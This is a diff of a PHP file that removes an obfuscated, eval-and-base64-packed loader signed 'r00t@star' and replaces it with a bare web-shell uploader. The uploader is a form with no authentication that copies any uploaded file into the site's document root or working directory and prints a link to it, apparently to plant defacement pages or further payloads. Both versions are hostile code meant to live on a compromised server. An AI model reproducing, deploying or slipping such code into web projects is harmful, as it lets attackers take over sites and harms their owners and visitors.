@@ -1,1 +1,39 @@
-<?php /*** PHP Encode v1.0 by r00t@star ***/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=0aefa58f10605da87be692d10db3c38ce08b63a4rVRRb9owEH5H4j+cIiRCRRsoXafRMS2DUNFRUpGwqiKVZYKBqDiOHNOtG/3vsx1oaYsKDzXSEd993/nOd2fLOthn5XOWdQD2KByTySK8gxu2gPo9vFkrIF6IGeNQB16piO+pwHw7cL+jCeeMI04SxkUUT81K6SyfS4lAIqIEzSMaiUw3xoIgGSFezDPjXxYTJJGmYacRti7wHeYCG5r/kApCzWI4J5gXlaag6A0lTGMMl3ADs3pUTyHDF3C6aBj5HJJLJfAs1lJblMjnwFIfS5D/AcBS/p4lyiwIgnwu0ymY3L7CAVJfS1SCpQYq70GlVht+OaXaPQSZ9qWUnr7KAAJ1jIUs6SpAeoOWL+RS6SXQkLmRcMYMleB6A0YQB/HGTp/7ie6u1htWpUKXARnWTmnWDJ5qBqX4TM0mns/BSzAlvKR0FbpJ17QTCgn7TTgZw+gBOvFYVlSWMobraLT4gBDlETUKZswo46XDbzqyY6oABa2DBggeUXMyJSI1Pb/V6ZWhWjk+KemmCGcSEC74HEWx7MLiTIikblkxvmMhGxOeHjE+tUaMUS2Oklmie01TZGOyRJjSSRmag37XvfKR53XRL6ffad9cOU6/DBM8T8k2xppw5Xp+ufoeou/4g37P79s9ry1d+v2Bs9PhLlDb7Xbd667btP2O29sJb7ruz47T7nSdMhRCFk+i6W74hS3z3weuIm53nG7LKxu6aI2sdsa7N/3qWvQVFjhJ5duxrin5Q0JFUqZoYhKaiAdzhSmV/uVzj0RWR1oSTqaIYhHOzKL1g/AZTqO5FRXLm+Ds4cv67jBbummrZ7UqBTkXYpHKDp+wbBTWENmtZxk5o3q+7Q+8+mqmWm7P2RydZ5xv988df41bdfNWZMv2HYA1cqjfwdvt0M1JTjcm+YdqbtDzXL8vwSZZ39FHpf+U/RNzeG6f293bLdGub2CY5X77yrrKepXuvonqFC8xFTh+8WQ9/gc=
+<div class="center"><form method="post" enctype="multipart/form-data">
+
+    <input type="radio" name="tipe" value="root">Home root<input type="radio" name="tipe" value="biasa">Biasa <br><br>
+   choose your file:&nbsp;&nbsp&nbsp;<input type="file" name= "idx_file">
+      <input type="submit" name="upload" value="upload">
+      </form>
+<?php
+if(isset($_POST['upload'])) {
+    switch($_POST['tipe']){
+        case "root":
+            $root = $_SERVER['DOCUMENT_ROOT'];
+$files = $_FILES['idx_file']['name'];
+$dest = $root.'/'.$files;
+	if(is_writable($root)) {
+		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
+			$web = "http://".$_SERVER['HTTP_HOST']."/";
+			echo "Ciee Sukses Uploadnya :* -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
+		} else {
+			echo "gagal upload root >:(";
+		}
+	} else {
+		echo "<font color='red'>klo ga bisa silahkan pakai yang biasa :)</font>";
+		} 
+
+     case "biasa":
+         $files = $_FILES['idx_file']['name'];
+
+if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
+    $web = "http://".$_SERVER['HTTP_HOST']."/";
+    echo "Sukses Upload => <a href='".$web.$files."' target='_blank>".$web.$files."</a>";
+		} else {
+			echo "<script> alert('gagal upload >:(');</script>";
+		}
+		break;
+        default: echo "<script>alert('Harap pilih opsi');</script>"; break;
+} 
+}
+echo "</div>";
+?>
